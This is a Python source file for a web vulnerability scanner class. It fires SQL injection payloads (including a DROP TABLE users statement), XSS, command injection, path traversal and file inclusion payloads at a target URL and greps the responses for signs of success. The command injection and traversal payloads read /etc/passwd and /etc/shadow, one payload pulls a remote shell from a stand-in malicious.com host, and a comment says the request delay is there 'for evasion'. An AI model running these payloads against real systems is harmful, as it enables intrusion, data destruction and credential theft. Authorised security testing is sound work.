import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re
import time
from includes.logging import Logger  

class AdvancedVulnerabilityScanner:
    def __init__(self, target_url, headers=None, timeout=10):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update(headers or {"User-Agent": "AdvancedPenTestSuite/1.0"})
        self.timeout = timeout
        self.logger = Logger()

    def sql_injection(self):
        payloads = [
            "' OR '1'='1", "'; DROP TABLE users; --", "\" OR \"1\"=\"1",
            "' OR 1=1--", "1' OR '1'='1'"
        ]
        patterns = [
            "SQL syntax.*MySQL",
            "Warning.*pg_query",
            "Microsoft OLE DB Provider for SQL Server",
            "Unclosed quotation mark after the character string",
            "Unknown column '.*' in '.*'"
        ]
        self.logger.log("Scanning for SQL Injection...")
        return self._test_injection(payloads, patterns, param="input")

    def xss_scan(self):
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=confirm('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        patterns = ["<script>alert\\(.*?\\)</script>", "<img src=.*? onerror=.*?>", "confirm\\(.*?\\)", "iframe src=.*?javascript:"]
        self.logger.log("Scanning for XSS...")
        return self._test_injection(payloads, patterns)

    def command_injection(self):
        payloads = [
            "; ls", "&& whoami", "| cat /etc/passwd", "`id`", "$(id)"
        ]
        patterns = ["root:x", "bin:x", "daemon:x"]
        self.logger.log("Scanning for Command Injection...")
        return self._test_injection(payloads, patterns, param="cmd")

    def file_inclusion(self):
        payloads = [
            "../../etc/passwd", "http://malicious.com/shell.php", "php://filter/convert.base64-encode/resource=index"
        ]
        patterns = ["root:x", "shell_exec", "malicious"]
        self.logger.log("Scanning for File Inclusion...")
        return self._test_injection(payloads, patterns, param="file")

    def path_traversal(self):
        payloads = [
            "../../etc/passwd", "../index.php", "/../../../../etc/shadow"
        ]
        patterns = ["root:x", "shadow:x"]
        self.logger.log("Scanning for Path Traversal...")
        return self._test_injection(payloads, patterns, param="path")

    def _test_injection(self, payloads, patterns, param="test"):
        results = []
        for payload in payloads:
            try:
                self.logger.log(f"Testing payload: {payload}")
                url = f"{self.target_url}?{param}={payload}"
                response = self.session.get(url, timeout=self.timeout)
                time.sleep(0.5)  # Introduce delay between requests for evasion
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        results.append((url, pattern))
                        break
            except requests.RequestException as e:
                self.logger.log(f"Error testing payload {payload}: {e}", level="error")
        return results

    def _extract_forms(self, url):
        response = self.session.get(url, timeout=self.timeout)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")

    def _submit_form(self, form, payload):
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        inputs = form.find_all("input")
        data = {input_.attrs.get("name"): payload for input_ in inputs if input_.attrs.get("name")}
        if method == "post":
            return self.session.post(urljoin(self.target_url, action), data=data, timeout=self.timeout)
        return self.session.get(urljoin(self.target_url, action), params=data, timeout=self.timeout)
